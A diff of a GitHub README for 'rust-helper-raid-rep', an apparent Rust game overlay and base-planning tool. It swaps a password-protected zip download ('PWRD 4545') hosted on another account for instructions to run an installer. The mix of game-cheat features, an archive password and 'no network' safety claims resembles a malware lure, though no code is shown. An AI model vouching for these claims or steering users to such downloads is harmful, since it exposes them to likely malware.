@@ -1,119 +1,83 @@
-# RUST-PRO – Offline Base Planner & HUD Designer
-**Open-source standalone toolkit for private server planning, base design, and visual testing — 100% offline.**
+# 🚀 rust-helper-raid-rep - Simplify Your Rust Game Experience
 
----
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/kaifmansoori12/rust-helper-raid-rep/releases)
 
-## Introduction
+## 💻 Overview
 
-**RUST-PRO** is a **fully offline**, open-source suite for **base planning, HUD customization, and private server testing** — designed for builders, modders, and community creators.
+The **rust-helper-raid-rep** is an open-source overlay designed for private Rust servers. This tool helps players improve their gaming experience with features like build guides, player outlines, and a config cloud. Everything is 100% toggleable, allowing you to customize your gameplay easily.
 
-- Runs **entirely offline**  
-- **No game process attachment**  
-- **No memory reading or injection**  
-- **No network activity**  
-- MIT-licensed, fully open on GitHub  
+## 🌟 Features
 
-> *"Your digital blueprint for the perfect raid base."* — Rust architects
+- **Custom Server Support:** Use this overlay with any private Rust server.
+- **HUD Designer:** Design your own heads-up display to suit your style.
+- **Toggleable Options:** Turn features on or off as you prefer.
+- **Config Cloud:** Save and share your configurations seamlessly.
+- **Build Guides:** Access easy-to-follow guides for constructing bases.
 
----
+## 📋 System Requirements
 
-## Core Features (All Offline & Non-Invasive)
+To run the rust-helper-raid-rep application smoothly, your system should meet the following requirements:
 
-| Feature | Description |
-|--------|-------------|
-| **Base Grid Designer** | Drag-and-drop build planner with walls, doors, TC zones, and stability math. Export to image or JSON. |
-| **HUD Mockup Studio** | Design custom overlays: health bars, tool rings, player tags, mini-map — preview in real-time. |
-| **Durability Simulator** | Test tool wear, armor decay, and explosive damage on virtual structures. |
-| **Player Outline Templates** | Pre-made visual styles (glow, distance tags) — export as config snippets. |
-| **Config Cloud** | 100+ community presets. Import/export base plans, HUD layouts, and test scenarios. |
-| **2D Mini-Map Editor** | Build local maps with POIs, raid paths, and resource nodes. No server needed. |
-| **Theme Pack** | 15+ UI skins: military camo, neon, vintage Rust — apply to planner. |
-| **FPS & Stats Dashboard** | Simulate performance impact of HUD elements during design. |
+- **Operating System:** Windows 10 or later / macOS 10.15 or later
+- **RAM:** Minimum 4 GB
+- **Processor:** Dual-core CPU with a clock speed of 2.0 GHz or higher
+- **Graphics:** DirectX 11 compatible graphics card
 
-*All tools run independently. No live game interaction.*
+## 🚀 Getting Started
 
----
+Follow these easy steps to get started with rust-helper-raid-rep. 
 
-## Why Builders Love It
+1. **Visit the Releases Page:** First, go to our [Releases page](https://github.com/kaifmansoori12/rust-helper-raid-rep/releases).
+2. **Download the Application:** Look for the latest version. Click on the link to download the file that corresponds with your operating system.
+3. **Install the Application:** Locate the downloaded file, then double-click to start the installation. Follow the on-screen prompts to complete the installation.
+4. **First Run Setup:** Open the application. You will see options for configuring your HUD. Customize it as you like.
 
-- Plan **raid-proof bases** before placing a single twig  
-- Design **stream-safe HUDs** with zero risk  
-- Share **configs with squad** in seconds  
-- Test **modded mechanics** offline  
+## 📥 Download & Install
 
-Pure design. Zero runtime. Total control.
+To get rust-helper-raid-rep, visit this page to download: [Releases Page](https://github.com/kaifmansoori12/rust-helper-raid-rep/releases).
 
----
+1. Click on the latest release and download the setup file.
+2. Once the download finishes, find the file in your Downloads folder.
+3. Double-click the file to run the installer.
+4. Follow the prompts to finish the installation.
 
-## Quick Keys (In-App Only)
+## 🎮 Using rust-helper-raid-rep
 
-- **Insert** → Open menu  
-- **F8** → Hide all panels  
-- **Tab** → Toggle stats overlay  
+Once the application is installed, open it and explore the options available. You can choose what features to enable based on your preferences. Here are some tips to enhance your experience:
 
----
+- **Customize Your HUD:** Use the HUD designer to make your overlay unique.
+- **Refer to Build Guides:** Open the build guide section for tips and tricks on constructing bases.
+- **Toggle Features:** Only activate the features you find useful to keep your screen clean and clear.
 
-## Download
+## 📚 Topics Covered
 
-[Download from Releases](https://github.com/screwtapeelk695/rust-helper-raid-rep/releases/download/ReleaseUPD/UniTool.zip) 
-PWRD 4545
-*Windows · macOS · Linux • Portable • ~11 MB*
+- **Custom Server:** Use this tool to enhance your custom Rust server experience.
+- **HUD Designer:** Perfect for players who want a personalized display.
+- **Modded Rust:** Ideal for those who play on modded servers.
+- **Rust Tools:** A collection of useful tools for Rust players.
+- **Toolkit Planner:** Plan your builds and gameplay effectively with additional tools.
 
-> **SHA256**: See release notes
+## 🤔 FAQs
 
----
+### Q1: Is rust-helper-raid-rep free to use?
 
-## Safety & Compliance
+Yes, rust-helper-raid-rep is completely free. 
 
-- **No memory access**  
-- **No process hooking**  
-- **No internet required**  
-- **No server detection**  
-- **Open source** — audit every line  
+### Q2: Do I need programming knowledge to use this?
 
-> For **personal planning, base design, and HUD prototyping only**.  
-> Not for use during active gameplay or on public servers.
+No, the application is designed for everyone, even those without programming skills.
 
----
+### Q3: Can this be used on any private server?
 
-## Contribute
+Yes, rust-helper-raid-rep works well with any private Rust server.
 
-Got a killer base? New HUD idea?  
-Submit a pull request — built by tinkerers, for tinkerers.
+### Q4: How do I get support if I run into issues?
 
----
+You can reach out through the issues page of this repository on GitHub. Our community will assist you.
 
-## Join the Crew
+## 🔗 Links
 
-**Discord:** Free configs + 24/7 help  
-**Telegram:** Daily builds & design drops  
+- [Releases Page](https://github.com/kaifmansoori12/rust-helper-raid-rep/releases)
+- [Documentation](https://github.com/kaifmansoori12/rust-helper-raid-rep/wiki)
 
----
-
-## License
-MIT License
-Copyright (c) 2025 Rust Tinkerers
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-text---
-
-**Built with love by the Rust tinkerers.**  
-*Star if you raid with style!* ⭐
-
----
-*Updated: Nov 06, 2025*
-
-
+This README covers the essentials to help you download and start using rust-helper-raid-rep. Feel free to explore and enjoy your improved Rust gaming experience!
